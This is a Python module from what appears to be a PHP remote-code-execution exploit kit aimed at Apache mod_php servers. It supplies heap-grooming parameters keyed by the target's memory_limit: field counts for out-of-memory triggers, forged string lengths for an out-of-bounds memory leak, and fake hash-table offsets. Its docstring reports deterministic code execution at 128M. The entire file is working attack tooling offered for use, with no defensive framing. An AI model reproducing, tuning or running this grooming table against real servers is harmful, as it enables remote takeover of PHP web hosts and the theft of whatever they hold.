# INDEX: calibrated groom sizing table by memory_limit | apache
"""memory_limit-parameterized groom sizing table.

Returns a calibrated groom profile for a target's `memory_limit`. The OOM
producers (disclose_arm send-cookie exhaust, forge_arm cheap-OOM) and the
disclose_read forged-string disclosure window must grow with memory_limit,
because the knife-edge is "allocate just past the limit during END cleanup".
The forge_fire fake-reference spray
(vl/n1/n2) is memory_limit-independent and is NOT scaled here.

Ported from JoasASantos/php2shell-exploit (lib/calibrate.py SIZING_PROFILES,
lib/payloads.py build_a1_body/LEAK_SPEC, lib/oom.py); the memory_limit scaling
table sits atop the 9bie 128M chain.

Scales memory_limit ONLY; it does not model session.sid_length (an independent
axis that changes the reclaim bin).

Platforms tested (8.4.26/trixie mod_php, Apache prefork):
  * 128M: table groom (parts=860, big=78) -> 8/8 RCE, deterministic.
  * 8M / 256M / 512M: author-asserted linear scaling, NOT reproduced on this
    build (256M measured 0 RCE). 8M is a distinct small-heap layout (different
    ht_offset + fake_len). See GROOM_VERIFIED for per-row status.

Field meanings (all per-profile):
  disclose_arm_big        disclose_arm count of 8000-byte value fields (the send_cookie OOM knob)
  disclose_arm_parts      disclose_arm count of depth-64 nested empty-file fields
  disclose_arm_fillers128 disclose_arm count of 103-byte-name bin-128 filler fields
  disclose_arm_burners    disclose_arm count of 4000-byte burner fields
  forge_arm_parts      forge_arm cheap-OOM nested-file field count
  forge_arm_fillers    forge_arm bin-32 short-field count (shifts the dangling ref)
  fake_len      disclose_read forged zend_string length = OOB disclosure window
  ht_offset     fake zend_array offset from the main chunk base
  leak_gfill    disclose_read number of G:511 full-chunk floods before the G:400 under-fill
"""
from __future__ import annotations

# Calibrated sizing table, indexed by memory_limit string.  128M is the
# author-verified baseline; the others follow the author's linear model
# (counts scale with memory_limit/128M; the >=128M structural offsets are
# constant; 8M is its own small-heap layout).
GROOM_PROFILES = {
    "8M": {
        "disclose_arm_big": 0, "disclose_arm_parts": 200, "disclose_arm_fillers128": 4, "disclose_arm_burners": 5,
        "forge_arm_parts": 200, "forge_arm_fillers": 30,
        "fake_len": 0x8000, "ht_offset": 0x1E398, "leak_gfill": 4,
    },
    "128M": {
        "disclose_arm_big": 78, "disclose_arm_parts": 860, "disclose_arm_fillers128": 14, "disclose_arm_burners": 20,
        "forge_arm_parts": 880, "forge_arm_fillers": 115,
        "fake_len": 0xC8000, "ht_offset": 0xF8398, "leak_gfill": 14,
    },
    "256M": {
        "disclose_arm_big": 160, "disclose_arm_parts": 1700, "disclose_arm_fillers128": 28, "disclose_arm_burners": 40,
        "forge_arm_parts": 1760, "forge_arm_fillers": 230,
        "fake_len": 0xC8000, "ht_offset": 0xF8398, "leak_gfill": 28,
    },
    "512M": {
        "disclose_arm_big": 320, "disclose_arm_parts": 3400, "disclose_arm_fillers128": 56, "disclose_arm_burners": 80,
        "forge_arm_parts": 3520, "forge_arm_fillers": 460,
        "fake_len": 0xC8000, "ht_offset": 0xF8398, "leak_gfill": 56,
    },
}

# Author-verified status per row (profiles/*.json + repo notes).
GROOM_VERIFIED = {"8M": False, "128M": True, "256M": False, "512M": False}


def _parse_limit_mib(memory_limit) -> int:
    """Return the memory_limit in MiB.  Accepts '128M', '256M', '1G', 134217728,
    or -1 (unlimited -> treated as a large 512M-class groom)."""
    if isinstance(memory_limit, int):
        if memory_limit < 0:
            return 512
        return max(1, memory_limit // (1024 * 1024))
    s = str(memory_limit).strip().upper()
    if s in ("-1", "0", ""):
        return 512
    mult = 1
    if s.endswith("K"):
        mult, s = 1 / 1024, s[:-1]
    elif s.endswith("M"):
        mult, s = 1, s[:-1]
    elif s.endswith("G"):
        mult, s = 1024, s[:-1]
    return max(1, int(float(s) * mult))


def get_groom_profile(memory_limit) -> dict:
    """Return the calibrated groom profile for a memory_limit.

    An exact table hit ('8M'/'128M'/'256M'/'512M') is returned verbatim.
    Anything else is derived by the author's linear model off the 128M row
    (counts scale by mib/128; the >=128M structural offsets stay constant).
    Below 48 MiB we fall back to the distinct 8M small-heap layout rather than
    linearly shrinking the 128M offsets (fake_len/ht_offset differ there)."""
    key = _normalize_key(memory_limit)
    if key in GROOM_PROFILES:
        prof = dict(GROOM_PROFILES[key])
        prof["memory_limit"] = key
        prof["source"] = "table"
        return prof

    mib = _parse_limit_mib(memory_limit)
    if mib < 48:
        prof = dict(GROOM_PROFILES["8M"])
        prof["memory_limit"] = f"{mib}M"
        prof["source"] = "8M-layout(<48MiB)"
        return prof

    k = mib / 128.0
    base = GROOM_PROFILES["128M"]
    prof = {
        "disclose_arm_big": max(1, round(base["disclose_arm_big"] * k)),
        "disclose_arm_parts": max(1, round(base["disclose_arm_parts"] * k)),
        "disclose_arm_fillers128": max(1, round(base["disclose_arm_fillers128"] * k)),
        "disclose_arm_burners": max(1, round(base["disclose_arm_burners"] * k)),
        "forge_arm_parts": max(1, round(base["forge_arm_parts"] * k)),
        "forge_arm_fillers": max(1, round(base["forge_arm_fillers"] * k)),
        "fake_len": base["fake_len"],
        "ht_offset": base["ht_offset"],
        "leak_gfill": max(1, round(base["leak_gfill"] * k)),
        "memory_limit": f"{mib}M",
        "source": f"linear(x{k:.3g} off 128M)",
    }
    return prof


def _normalize_key(memory_limit) -> str:
    """Map an input to a canonical table key when it lands on one exactly."""
    if isinstance(memory_limit, str) and memory_limit.strip().upper() in GROOM_PROFILES:
        return memory_limit.strip().upper()
    mib = _parse_limit_mib(memory_limit)
    return {8: "8M", 128: "128M", 256: "256M", 512: "512M"}.get(mib, f"{mib}M")


def leak_spec_for(profile: dict, xfields: int = 900,
                  pages: int = 511, under: int = 400, page: str = "0x137"):
    """Build the disclose_read leak spec list for a profile, with the G:511 full-chunk
    flood count driven by profile['leak_gfill']."""
    g = int(profile["leak_gfill"])
    return ([f"G:{pages}:{page}"] * g +
            [f"G:{under}:{page}", f"G:{pages}:{page}", f"X:{xfields}"])


def detect_memory_limit(oom_big) -> str:
    """Estimate memory_limit from the disclose_arm --big value that first triggers OOM.
    (Author's model: ~linear, each big unit ~8KB of value + fixed overhead.)"""
    if oom_big is None:
        return "unknown"
    if oom_big <= 5:
        return "8M"
    if oom_big <= 90:
        return "128M"
    if oom_big <= 180:
        return "256M"
    if oom_big <= 360:
        return "512M"
    return f"{512 * max(1, oom_big // 360)}M"


if __name__ == "__main__":
    import json
    import sys
    arg = sys.argv[1] if len(sys.argv) > 1 else None
    if arg:
        print(json.dumps(get_groom_profile(arg), indent=2))
    else:
        for ml in ("8M", "16M", "128M", "200M", "256M", "512M", "1G", "-1"):
            p = get_groom_profile(ml)
            print(f"{ml:>5} -> big={p['disclose_arm_big']:<4} disclose_arm_parts={p['disclose_arm_parts']:<5} "
                  f"forge_arm_parts={p['forge_arm_parts']:<5} forge_arm_fill={p['forge_arm_fillers']:<4} "
                  f"gfill={p['leak_gfill']:<3} fake_len={p['fake_len']:#x} "
                  f"ht_off={p['ht_offset']:#x} [{p['source']}]")
